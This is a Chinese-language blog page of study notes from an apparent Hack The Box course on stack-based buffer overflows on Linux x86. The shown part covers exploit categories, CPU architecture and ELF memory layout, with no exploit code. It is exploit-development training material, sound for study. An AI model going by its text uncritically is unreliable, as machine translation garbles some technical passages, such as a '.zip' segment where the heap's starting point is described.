@@ -1,0 +1,815 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Stack-BasedBufferOverflowsonLinuxx86HTB | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction缓冲区溢出在当今世界已经变得不那么常见了，因为现代编译器已经内置了内存保护，使内存损坏错误很难意外发生。话虽如此，像C这样的语言不会很快消失，它们在嵌入式软件和物联网中占主导地位。我最近最喜欢的一个缓冲区溢出是CVE-2021-3156，这是sudo中基于堆的缓冲区溢出。 这些攻击并不局限于二进制文件，大量的缓冲区溢出发生在Web应用程序中，特别是使用自定义Web服务器的嵌">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Stack-BasedBufferOverflowsonLinuxx86HTB">
+<meta property="og:url" content="http://mikannse.space/2023/11/11/Stack-BasedBufferOverflowsonLinuxx86HTB/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="Introduction缓冲区溢出在当今世界已经变得不那么常见了，因为现代编译器已经内置了内存保护，使内存损坏错误很难意外发生。话虽如此，像C这样的语言不会很快消失，它们在嵌入式软件和物联网中占主导地位。我最近最喜欢的一个缓冲区溢出是CVE-2021-3156，这是sudo中基于堆的缓冲区溢出。 这些攻击并不局限于二进制文件，大量的缓冲区溢出发生在Web应用程序中，特别是使用自定义Web服务器的嵌">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2023-11-11T03:29:39.000Z">
+<meta property="article:modified_time" content="2023-11-11T03:34:59.041Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="网安">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2023/11/11/Stack-BasedBufferOverflowsonLinuxx86HTB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Stack-BasedBufferOverflowsonLinuxx86HTB',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2023-11-11 11:34:59'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Stack-BasedBufferOverflowsonLinuxx86HTB</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-11T03:29:39.000Z" title="发表于 2023-11-11 11:29:39">2023-11-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-11T03:34:59.041Z" title="更新于 2023-11-11 11:34:59">2023-11-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">12.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>49分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Stack-BasedBufferOverflowsonLinuxx86HTB"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>缓冲区溢出在当今世界已经变得不那么常见了，因为现代编译器已经内置了内存保护，使内存损坏错误很难意外发生。话虽如此，像C这样的语言不会很快消失，它们在嵌入式软件和物联网中占主导地位。我最近最喜欢的一个缓冲区溢出是<a target="_blank" rel="noopener" href="https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">CVE-2021-3156</a>，这是sudo中基于堆的缓冲区溢出。</p>
+<p>这些攻击并不局限于二进制文件，大量的缓冲区溢出发生在Web应用程序中，特别是使用自定义Web服务器的嵌入式设备。一个很好的例子是<a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/news/security/you-can-bypass-authentication-on-hpe-ilo4-servers-with-29-a-characters/">CVE-2017-12542</a>与HP iLO（集成熄灯）管理设备。在HTTP头参数中发送29个字符会导致缓冲区溢出，从而绕过登录。我喜欢这个例子，因为不需要实际的有效负载，因为系统在到达错误时“失败打开”。</p>
+<p>简而言之，缓冲区溢出是由不正确的程序代码引起的，它不能正确地处理CPU的太大数据量，因此可以操纵CPU的处理。例如，假设太多数据被写入到不受限制的保留存储器<code>buffer</code>或<code>stack</code>。在这种情况下，特定的寄存器将被重写，这可能允许代码被执行。</p>
+<p>缓冲区溢出可能导致程序崩溃、损坏数据或损害程序运行时的数据结构。最后一个可以用任意数据覆盖特定程序的<code>return address</code>，允许攻击者通过传递任意机器代码来执行容易受到缓冲区溢出攻击的<code>privileges of the process</code>命令。这些代码通常是为了给予我们更方便的访问系统的权限，以便为我们自己的目的使用它。在普通服务器中，这种缓冲区溢出，互联网蠕虫也会利用客户端软件。</p>
+<p>Unix系统上一个特别流行的目标是root访问，它给我们访问系统的所有权限。但是，正如人们经常误解的那样，这并不意味着“只”导致标准用户特权的缓冲区溢出是无害的。如果您已经拥有用户权限，那么获得梦寐以求的root访问权限通常要容易得多。</p>
+<p>缓冲区溢出，除了编程疏忽，主要是由基于冯诺依曼架构的计算机系统。</p>
+<p>缓冲区溢出最重要的原因是使用的编程语言不能自动监控内存缓冲区或堆栈的限制，以防止（基于堆栈的）缓冲区溢出。其中包括<code>C</code>和<code>C++</code>语言，它们强调性能，不需要监控。</p>
+<p>出于这个原因，开发人员被迫在编程代码中定义这些区域，这会使脆弱性增加许多倍。出于测试目的或由于疏忽，这些区域通常未定义。即使它们被用于测试目的，它们也可能在开发过程的最后被忽略。</p>
+<p>但是，并不是每个应用程序环境都可能出现缓冲区溢出情况。例如，由于Java处理内存管理的方式，独立的Java应用程序与其他应用程序相比可能性最小。Java使用“垃圾收集”技术来管理内存，这有助于防止缓冲区溢出情况。</p>
+<h2 id="Exploit-Development-Introduction"><a href="#Exploit-Development-Introduction" class="headerlink" title="Exploit Development Introduction"></a>Exploit Development Introduction</h2><p>在特定软件甚至其版本被确定之后，漏洞利用开发就出现了。开发阶段的目标是使用发现的信息及其分析来开发潜在的方法，以获得交互和/或访问目标系统。</p>
+<p>开发我们自己的漏洞可能非常复杂，需要深入了解CPU操作和作为我们目标的软件功能。许多漏洞是用不同的编程语言编写的。最流行的编程语言之一是<code>Python</code>，因为它易于理解和编写。在本模块中，我们将重点介绍开发漏洞的基本技术，因为在处理内存的各种安全机制之前，必须开发<code>fundamental understanding</code>。</p>
+<p>在我们运行任何漏洞之前，我们需要了解什么是漏洞。漏洞利用是指通过滥用发现的漏洞导致服务执行我们想要的操作的代码。在我们的报告中，此类代码通常用作<code>proof-of-concept</code>（<code>POC</code>）。</p>
+<p>有两种类型的漏洞。一个是未知的（<code>0-day</code> exploits），另一个是已知的（<code>N-day</code> exploits）。</p>
+<h4 id="0-Day-Exploits"><a href="#0-Day-Exploits" class="headerlink" title="0-Day Exploits"></a>0-Day Exploits</h4><p><code>0-day exploit</code>是利用特定应用程序中新发现的漏洞的代码。该漏洞不需要在应用程序中公开。此类漏洞的危险在于，如果此应用程序的开发人员没有被告知该漏洞，他们可能会继续使用新的更新。</p>
+<h4 id="N-Day-Exploits"><a href="#N-Day-Exploits" class="headerlink" title="N-Day Exploits"></a>N-Day Exploits</h4><p>如果漏洞被发布并通知开发人员，他们仍然需要时间来编写修复程序以尽快阻止它们。当它们被发布时，他们谈论<code>N-day exploits</code>，计算漏洞发布和对未修补系统的攻击之间的天数。</p>
+<p>此外，这些漏洞可以分为四个不同的类别：</p>
+<ul>
+<li><code>Local</code></li>
+<li><code>Remote</code></li>
+<li><code>DoS</code></li>
+<li><code>WebApp</code></li>
+</ul>
+<h4 id="Local-Exploits"><a href="#Local-Exploits" class="headerlink" title="Local Exploits"></a>Local Exploits</h4><p>打开文件时可以执行本地漏洞/恶意升级漏洞。但前提是本地软件存在安全漏洞。通常是本地漏洞（例如，在PDF文档中或作为Word或Excel文件中的宏）首先尝试利用导入文件的程序中的安全漏洞来获得更高的权限级别，从而在操作系统中加载和执行<code>malicious code</code> / <code>shellcode</code>。该漏洞执行的实际操作称为<code>payload</code>。</p>
+<h4 id="Remote-Exploits"><a href="#Remote-Exploits" class="headerlink" title="Remote Exploits"></a>Remote Exploits</h4><p>远程攻击通常利用缓冲区溢出漏洞来获取系统上运行的有效负载。这种类型的攻击不同于本地攻击，因为它们可以通过网络执行所需的操作。</p>
+<h4 id="DoS-Exploits"><a href="#DoS-Exploits" class="headerlink" title="DoS Exploits"></a>DoS Exploits</h4><p>DoS（<code>Denial of Service</code>）漏洞是阻止其他系统运行的代码，即，导致单个软件或整个系统崩溃。</p>
+<h4 id="WebApp-Exploits"><a href="#WebApp-Exploits" class="headerlink" title="WebApp Exploits"></a>WebApp Exploits</h4><p>Web应用程序漏洞利用利用此类软件中的漏洞。例如，此类漏洞可能允许在应用程序本身或底层数据库上注入命令。</p>
+<h2 id="CPU-Architecture"><a href="#CPU-Architecture" class="headerlink" title="CPU Architecture"></a>CPU Architecture</h2><p><code>Von-Neumann</code>的架构是由匈牙利数学家约翰·冯·诺依曼（John von Neumann）开发的，它由四个功能单元组成：</p>
+<ul>
+<li><code>Memory</code></li>
+<li><code>Control Unit</code></li>
+<li><code>Arithmetical Logical Unit</code></li>
+<li><code>Input/Output Unit</code></li>
+</ul>
+<p>在冯-诺依曼架构中，最重要的单元<code>Arithmetical Logical Unit</code>（<code>ALU</code>）和<code>Control Unit</code>（<code>CU</code>）被组合在实际的<code>Central Processing Unit</code>（<code>CPU</code>）中。<code>CPU</code>负责执行<code>instructions</code>和<code>flow control</code>。这些指令一个接一个地一步一步地执行。命令和数据由<code>CU</code>从存储器中取出。 处理器、存储器和输入/输出单元之间的连接称为<code>bus system</code>，在原始的冯·诺依曼架构中没有提到，但在实践中起着重要作用。在Von-Neumann架构中，所有指令和数据都通过<code>bus system</code>传输。</p>
+<h4 id="Von-Neumann-Architecture"><a href="#Von-Neumann-Architecture" class="headerlink" title="Von-Neumann Architecture"></a>Von-Neumann Architecture</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/von_neumann3.png" alt="image"></p>
+<h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h3><p>内存可以分为两种不同的类别：</p>
+<ul>
+<li><code>Primary Memory</code></li>
+<li><code>Secondary Memory</code></li>
+</ul>
+<h4 id="Primary-Memory"><a href="#Primary-Memory" class="headerlink" title="Primary Memory"></a>Primary Memory</h4><p><code>primary memory</code>是<code>Cache</code>和<code>Random Access Memory</code>（<code>RAM</code>）。如果我们从逻辑上思考，记忆只不过是一个储存信息的地方。我们可以把它看作是把东西留在我们的一个朋友那里，以后再去拿。但是，为了做到这一点，有必要知道朋友的<code>address</code>来捡起我们留下的东西。#6是一样的。RAM描述了一种内存类型，其内存分配可以通过其<code>RAM</code>直接随机访问。</p>
+<p><code>cache</code>集成到处理器中，用作缓冲区，在最佳情况下，确保处理器始终提供数据和程序代码。在程序代码和数据进入处理器进行处理之前，RAM充当数据存储器。RAM的大小决定了处理器可以存储的数据量。然而，当主存储器断电时，所有存储的内容都将丢失。</p>
+<h4 id="Secondary-Memory"><a href="#Secondary-Memory" class="headerlink" title="Secondary Memory"></a>Secondary Memory</h4><p><code>secondary memory</code>是外部数据存储器，例如计算机的<code>HDD/SSD</code>，<code>Flash Drives</code>和<code>CD/DVD-ROMs</code>，其由CPU直接访问，但通过<code>not</code>接口。换句话说，它是一个大容量存储设备。它用于永久存储目前不需要处理的数据。与<code>I/O</code>相比，它具有更高的存储容量，即使没有电源也可以永久存储数据，并且工作速度要慢得多。</p>
+<h3 id="Control-Unit"><a href="#Control-Unit" class="headerlink" title="Control Unit"></a>Control Unit</h3><p><code>Control Unit</code>（<code>CU</code>）负责处理器各个部件的正确交互。内部总线连接用于<code>CU</code>的任务。<code>CU</code>的任务可以总结如下：</p>
+<ul>
+<li>Reading data from the RAM</li>
+<li>Saving data in RAM</li>
+<li>Provide, decode and execute an instruction</li>
+<li>Processing the inputs from peripheral devices</li>
+<li>Processing of outputs to peripheral devices</li>
+<li>Interrupt control</li>
+<li>Monitoring of the entire system</li>
+</ul>
+<p><code>CU</code>包含<code>Instruction Register</code>（<code>IR</code>），其中包含处理器解码并相应执行的所有指令。指令解码器翻译指令并将它们传递给执行单元，然后执行单元执行指令。执行单元将数据传输到<code>ALU</code>进行计算，并从那里接收返回的结果。执行过程中使用的数据暂时存储在<code>registers</code>中。</p>
+<h3 id="Central-Processing-Unit"><a href="#Central-Processing-Unit" class="headerlink" title="Central Processing Unit"></a>Central Processing Unit</h3><p><code>Central Processing Unit</code>（<code>CPU</code>）是计算机中提供实际处理能力的功能单元。它负责处理信息和控制处理操作。为此，<code>CPU</code>从内存中一个接一个地获取命令并启动数据处理。</p>
+<p>处理器通常也被称为<code>Microprocessor</code>，当它被放置在单个电子电路中时，就像我们的PC一样。</p>
+<p>每个<code>CPU</code>都有一个构建它的架构。最著名的<code>CPU architectures</code>是：</p>
+<ul>
+<li><code>x86</code>/<code>i386</code> - (AMD &amp; Intel)</li>
+<li><code>x86-64</code>/<code>amd64</code> - (Microsoft &amp; Sun)</li>
+<li><code>ARM</code> - (Acorn)</li>
+</ul>
+<p>这些CPU架构中的每一个都以特定的方式构建，称为<code>Instruction Set Architecture</code>（<code>ISA</code>），CPU使用它来执行其进程。因此，<code>ISA</code>描述了CPU关于所使用的指令集的行为。指令集被定义为独立于特定的实现。最重要的是，伊萨使我们有可能理解<code>machine code</code>在<code>assembly language</code>中关于<code>registers</code>、<code>data types</code>等的统一行为。</p>
+<p>有四种不同类型的<code>ISA</code>：</p>
+<ul>
+<li><code>CISC</code> - <code>Complex Instruction Set Computing</code> </li>
+<li><code>RISC</code> - <code>Reduced Instruction Set Computing</code> </li>
+<li><code>VLIW</code> - <code>Very Long Instruction Word</code> </li>
+<li><code>EPIC</code> - <code>Explicitly Parallel Instruction Computing</code></li>
+</ul>
+<h4 id="RISC"><a href="#RISC" class="headerlink" title="RISC"></a>RISC</h4><p><code>RISC</code>代表<code>Reduced Instruction Set Computer</code>，这是一种微处理器架构设计，旨在将汇编编程指令集的复杂性简化为一个时钟周期。这导致CPU的时钟频率更高，但由于使用了更小的指令集，因此能够更快地执行。通过指令集，我们指的是给定处理器可以执行的机器指令集。例如，我们可以在今天的大多数智能手机中找到<code>RISC</code>。尽管如此，几乎所有的CPU都有一部分<code>RISC</code>。<code>RISC</code>架构具有固定长度的指令，定义为<code>32-bit</code>和<code>64-bit</code>。</p>
+<h4 id="CISC"><a href="#CISC" class="headerlink" title="CISC"></a>CISC</h4><p>与RISC相反，<code>Complex Instruction Set Computer</code>（<code>CISC</code>）是一种具有广泛而复杂的指令集的处理器架构。由于计算机及其存储器的历史发展，在第二代计算机中，重复出现的指令序列被组合成复杂的指令。与RISC相比，<code>CISC</code>架构中的寻址不需要32位或64位，但可以使用<code>8-bit</code>模式完成。</p>
+<h4 id="Instruction-Cycle"><a href="#Instruction-Cycle" class="headerlink" title="Instruction Cycle"></a>Instruction Cycle</h4><p>指令集描述了处理器的所有机器指令。指令集的范围根据处理器类型的不同而有很大的不同。每个CPU可能有不同的指令周期和指令集，但它们在结构上都是相似的，我们可以总结如下：</p>
+<table>
+<thead>
+<tr>
+<th><strong>Instruction</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1. FETCH</code></td>
+<td>从<code>Instruction Address Register</code>（<code>IAR</code>）读取下一个机器指令地址。然后从<code>Cache</code>或<code>RAM</code>装载到<code>Instruction Register</code>（<code>IR</code>）。</td>
+</tr>
+<tr>
+<td><code>2. DECODE</code></td>
+<td>指令解码器转换指令并启动必要的电路来执行指令。</td>
+</tr>
+<tr>
+<td><code>3. FETCH OPERANDS</code></td>
+<td>如果必须加载更多数据以供执行，则将这些数据从该高速缓存或<code>RAM</code>加载到工作寄存器中。</td>
+</tr>
+<tr>
+<td><code>4. EXECUTE</code></td>
+<td>指令被执行。例如，这可以是<code>ALU</code>中的操作、程序中的跳转、将结果写回工作寄存器或外围设备的控制。根据某些指令的结果，设置状态寄存器，可以由后续指令进行评估。</td>
+</tr>
+<tr>
+<td><code>5. UPDATE INSTRUCTION POINTER</code></td>
+<td>如果在EXECUTE阶段没有执行跳转指令，则<code>IAR</code>现在增加指令的长度，以便它指向下一条机器指令。</td>
+</tr>
+</tbody></table>
+<h1 id="Fundamentals"><a href="#Fundamentals" class="headerlink" title="Fundamentals"></a>Fundamentals</h1><h2 id="Stack-Based-Buffer-Overflow"><a href="#Stack-Based-Buffer-Overflow" class="headerlink" title="Stack-Based Buffer Overflow"></a>Stack-Based Buffer Overflow</h2><p>内存异常是操作系统对现有软件中的错误或执行这些错误的反应。这是过去十年中程序流中大多数安全漏洞的原因。编程错误经常发生，导致缓冲区溢出，这是由于在使用低抽象语言（如<code>C</code>或<code>C++</code>）编程时疏忽所致。</p>
+<p>这些语言几乎直接编译成机器码，与Java或Python等高度抽象的语言相反，它们几乎不通过控制结构操作系统运行。缓冲区溢出是一种错误，它允许太大的数据无法放入操作系统内存中不够大的缓冲区，从而使该缓冲区溢出。这种错误处理的结果是，所执行程序的其他函数的内存被覆盖，从而可能产生安全漏洞。</p>
+<p>这种程序（二进制文件）是存储在数据存储介质上的通用可执行文件。对于这种可执行二进制文件有几种不同的文件格式。例如，<code>Portable Executable Format</code>（<code>PE</code>）用于Microsoft平台。</p>
+<p>可执行文件的另一种格式是<code>Executable and Linking Format</code>（<code>ELF</code>），几乎所有现代的<code>UNIX</code>变体都支持。如果链接器加载了这样一个可执行的二进制文件，并且程序将被执行，则相应的程序代码将被加载到主存储器中，然后由CPU执行。</p>
+<p>程序在初始化和执行期间将数据和指令存储在内存中。这些是在执行的软件中显示或由用户输入的数据。特别是对于预期的用户输入，必须通过保存输入来预先创建缓冲区。</p>
+<p>这些指令用于模拟程序流。其中，返回地址存储在内存中，它引用其他内存地址，从而定义程序的控制流。如果使用缓冲区溢出故意覆盖这样的返回地址，则攻击者可以通过使返回地址引用另一个函数或子例程来操纵程序流。此外，可以跳回到先前由用户输入引入的代码。</p>
+<p>为了理解它在技术层面上的工作原理，我们需要熟悉它是如何工作的：</p>
+<ul>
+<li>存储器被划分和使用</li>
+<li>调试器显示并命名各个指令</li>
+<li>调试器可用于检测此类漏洞</li>
+<li>我们可以操纵记忆</li>
+</ul>
+<p>另一个关键点是，漏洞通常只适用于特定版本的软件和操作系统。因此，我们必须重建和重新配置目标系统，使其恢复到相同的状态。之后，安装并分析我们正在调查的程序。大多数情况下，如果我们错过了用提升的权限重新启动程序的机会，我们将只有一次尝试利用程序。</p>
+<h3 id="The-Memory"><a href="#The-Memory" class="headerlink" title="The Memory"></a>The Memory</h3><p>当程序被调用时，这些部分被映射到进程中的段，并且这些段被加载到内存中，如<code>ELF</code>文件所描述的。</p>
+<h4 id="Buffer"><a href="#Buffer" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_1.png" alt="image"></p>
+<h4 id="text"><a href="#text" class="headerlink" title=".text"></a>.text</h4><p><code>.text</code>部分包含程序的实际汇编指令。此区域可以是只读的，以防止进程意外修改其指令。任何写入此区域的尝试都将不可避免地导致分段错误。</p>
+<h4 id="data"><a href="#data" class="headerlink" title=".data"></a>.data</h4><p><code>.data</code>部分包含由程序显式初始化的全局和静态变量。</p>
+<h4 id="bss"><a href="#bss" class="headerlink" title=".bss ."></a>.bss .</h4><p>一些编译器和链接器使用<code>.bss</code>部分作为数据段的一部分，其中包含静态分配的变量，这些变量由0位独占表示。</p>
+<h4 id="The-Heap"><a href="#The-Heap" class="headerlink" title="The Heap"></a>The Heap</h4><p><code>Heap memory</code>从该区域分配。这个区域从“. zip”段的末尾开始，向更高的内存地址增长。</p>
+<h4 id="The-Stack"><a href="#The-Stack" class="headerlink" title="The Stack"></a>The Stack</h4><p><code>Stack memory</code>是一个<code>Last-In-First-Out</code>数据结构，其中存储了返回地址、参数和帧指针（取决于编译器选项）。<code>C/C++</code>局部变量存储在这里，你甚至可以将代码复制到堆栈中。<code>Stack</code>是<code>RAM</code>中的定义区域。链接器保留这个区域，通常将堆栈放在RAM的较低区域，在全局变量和静态变量之上。内容是通过<code>stack pointer</code>访问的，在初始化期间设置为堆栈的上端。在执行期间，堆栈的已分配部分向下增长到较低的内存地址。</p>
